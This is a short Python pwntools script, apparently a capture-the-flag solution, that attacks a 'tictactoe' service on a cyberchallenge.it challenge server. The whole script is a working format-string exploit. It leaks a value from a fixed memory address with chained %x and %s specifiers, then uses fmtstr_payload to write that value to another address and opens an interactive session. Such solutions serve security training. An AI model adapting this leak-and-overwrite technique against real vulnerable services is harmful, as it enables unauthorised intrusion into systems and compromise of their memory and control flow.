from pwn import *

r = remote("tictactoe.challs.cyberchallenge.it", 9132)

r.recv()
r.sendline(b"3")
sys_address = 0x804a2a4

payload = p32(sys_address)
payload += b"%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x_%s"

r.sendline(payload)
r.recvuntil("understand:")
r.recvuntil("_")
res= r.recvuntil(",")
value = res[0:4]

integer_value = int.from_bytes(value, 'little')

payload = fmtstr_payload(15, {0x804a290 : value})

r.sendline(payload)

r.interactive()